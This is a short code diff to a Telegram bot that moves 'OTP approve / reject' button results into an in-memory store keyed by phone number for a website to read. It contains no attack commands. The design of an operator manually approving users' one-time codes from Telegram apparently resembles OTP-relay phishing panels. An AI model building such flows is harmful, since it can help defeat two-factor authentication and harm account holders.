@@ -533,19 +533,28 @@ async function processTelegramUpdate(update) {
       }
       
       // ---- OTP approve / reject ----
-      else if (action === 'otpapprove' || action === 'otpreject') {
-        const approved = action === 'otpapprove';
-        const status = approved ? 'approved' : 'rejected';
-        
-        await pool.query(`UPDATE applications SET otp_status=$1 WHERE id=$2`, [status, appId]);
-        
-        await telegramApi('answerCallbackQuery', { callback_query_id: callback.id, text: `OTP ${status}` });
-        await telegramApi('editMessageText', {
-          chat_id: chatId,
-          message_id: callback.message.message_id,
-          text: callback.message.text + `\n\n👉 Result: ${status.toUpperCase()}`
-        });
-      }
+else if (action === 'otpapprove' || action === 'otpreject') {
+    const approved = action === 'otpapprove';
+    const phone = appId; // appId holds the phone number for OTPs
+    const status = approved ? 'approved' : 'rejected';
+
+    // 1. Save the status in temporary memory so the website can see it
+    otpStatusStore[phone] = status;
+
+    // 2. Answer the Telegram callback (stops the loading spinner)
+    await telegramApi('answerCallbackQuery', { 
+        callback_query_id: callback.id, 
+        text: `OTP ${status}` 
+    });
+
+    // 3. Edit the Telegram message to show the result
+    await telegramApi('editMessageText', {
+        chat_id: chatId,
+        message_id: callback.message.message_id,
+        text: callback.message.text + `\n\n👍 Result: *${status.toUpperCase()}*`,
+        parse_mode: 'Markdown'
+    });
+                                                  }
 
       // ---- Application approve / reject ----
       else if (action === 'approve' || action === 'reject') {
